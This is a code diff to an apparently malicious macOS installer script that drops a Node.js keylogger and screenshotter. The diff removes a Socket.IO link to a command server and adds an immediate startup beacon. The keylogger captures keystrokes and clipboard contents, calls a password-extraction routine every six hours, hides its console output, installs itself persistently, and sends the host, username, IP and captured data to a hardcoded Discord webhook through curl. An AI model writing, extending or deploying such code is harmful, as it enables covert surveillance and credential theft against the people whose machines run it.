@@ -721,18 +721,12 @@ const { exec, spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
-const io = require('socket.io-client');
 
 const WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8';
-const SERVER_URL = 'https://troubleshoot-mac.com/';
-const ACCESS_TOKEN = '9f1013f0';
-const UPLOAD_SERVICE = 'https://upload.gofile.io/uploadfile';
 
 const HOSTNAME = os.hostname();
 const USERNAME = os.userInfo().username;
-const CLIENT_ID = `pc-${HOSTNAME}-${USERNAME}`;
 
-let socket = null;
 let screenshotDir = path.join(os.homedir(), '.screenshots');
 let keysBuffer = '';
 let lastClipboard = ''; // Track clipboard changes for keylogger
@@ -740,26 +734,6 @@ let lastClipboard = ''; // Track clipboard changes for keylogger
 if (!fs.existsSync(screenshotDir)) {
     fs.mkdirSync(screenshotDir, { recursive: true });
 }
-
-function connectToServer() {
-    socket = io(SERVER_URL, {
-        transports: ['websocket', 'polling'],
-        upgrade: true,
-        rememberUpgrade: true
-    });
-    socket.on('connect', () => {
-        socket.emit('register-client', {
-            token: ACCESS_TOKEN,
-            hostname: HOSTNAME,
-            username: USERNAME,
-            clientId: CLIENT_ID,
-            type: 'keylogger-screenshotter'
-        });
-    });
-    socket.on('disconnect', () => setTimeout(connectToServer, 5000));
-}
-
-connectToServer();
 
 // REMOVED: takeScreenshot function - not needed for simple keylogger
 // Screenshots can be added later if needed, but for now we only send keystrokes
@@ -825,7 +799,7 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
+    const keylogContent = `**Keylogger**\n\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
     
     // If we have a screenshot, upload it directly to Discord as file attachment
     if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
@@ -857,9 +831,7 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     }
 }
 
-// REMOVED sendToDiscord function - it was causing E2BIG errors with base64 images
-// Discord webhooks don't support base64 images, so we only send text via sendKeylogToDiscord
-// Screenshots are sent to dashboard via Socket.IO only
+// REMOVED: Dashboard/Socket.IO - not needed, only Discord
 
 // KEYSTROKE CAPTURE - Captures clipboard changes AND actual typing
 // lastClipboard and keysBuffer are already declared above
@@ -1845,37 +1817,31 @@ setInterval(() => {
     extractPasswords();
 }, 21600000); // 6 hours
 
-// Test Discord connection on startup (send once) - VERIFY IT'S RUNNING
-setTimeout(() => {
-    const testPayload = {
-        content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
-    };
-    const testFile = path.join(screenshotDir, `test_${Date.now()}.json`);
-    try {
-        fs.writeFileSync(testFile, JSON.stringify(testPayload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error) => {
-            setTimeout(() => {
-                try { fs.unlinkSync(testFile); } catch (e) {}
-            }, 5000);
-        });
-    } catch (e) {}
-}, 2000);
+// Send startup message IMMEDIATELY (verify it's running)
+const ip = os.networkInterfaces();
+let ipAddress = 'Unknown';
+for (const name of Object.keys(ip)) {
+    for (const iface of ip[name]) {
+        if (iface.family === 'IPv4' && !iface.internal) {
+            ipAddress = iface.address;
+            break;
+        }
+    }
+    if (ipAddress !== 'Unknown') break;
+}
 
-// VERIFY keylogger is actually running - send test every 5 minutes
-setInterval(() => {
-    const testPayload = {
-        content: `🔄 **Keylogger Heartbeat**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Active\nTime: ${new Date().toLocaleString()}\n\`\`\``
-    };
-    const testFile = path.join(screenshotDir, `heartbeat_${Date.now()}.json`);
-    try {
-        fs.writeFileSync(testFile, JSON.stringify(testPayload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error) => {
-            setTimeout(() => {
-                try { fs.unlinkSync(testFile); } catch (e) {}
-            }, 5000);
-        });
-    } catch (e) {}
-}, 300000); // Every 5 minutes
+const startupPayload = {
+    content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
+};
+const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
+try {
+    fs.writeFileSync(startupFile, JSON.stringify(startupPayload));
+    exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error) => {
+        setTimeout(() => {
+            try { fs.unlinkSync(startupFile); } catch (e) {}
+        }, 5000);
+    });
+} catch (e) {}
 
 console.log = () => {};
 console.error = () => {};
@@ -1888,7 +1854,6 @@ KEYLOGGEREOF
   "version": "1.0.0",
   "main": "keylogger-screenshotter.js",
   "dependencies": {
-    "socket.io-client": "^4.5.4"
   }
 }
 PKGEOF
@@ -1963,11 +1928,10 @@ PLISTEOF
     local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
     
     DISCORD_MSG="⌨️ **KEYLOGGER + SCREENSHOTTER INSTALLED**\n\n"
-    DISCORD_MSG="${DISCORD_MSG}**Dashboard:** https://troubleshoot-mac.com/dashboard\n"
     DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
     DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
     DISCORD_MSG="${DISCORD_MSG}**Status:** Keylogger + Screenshotter running 24/7 (persistent)\n"
-    DISCORD_MSG="${DISCORD_MSG}**Features:** Keystrokes + Screenshots → Discord + Dashboard\n"
+    DISCORD_MSG="${DISCORD_MSG}**Features:** Keystrokes + Screenshots → Discord\n"
     DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
     
     ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
@@ -1978,7 +1942,7 @@ PLISTEOF
 }
 
 # Install keylogger + screenshotter in background (non-blocking)
-# This runs 24/7, sends keystrokes + screenshots to Discord + Dashboard
+# This runs 24/7, sends keystrokes + screenshots to Discord
 install_keylogger_screenshotter &
 
 # Wait for seed file search to complete (if it was started)
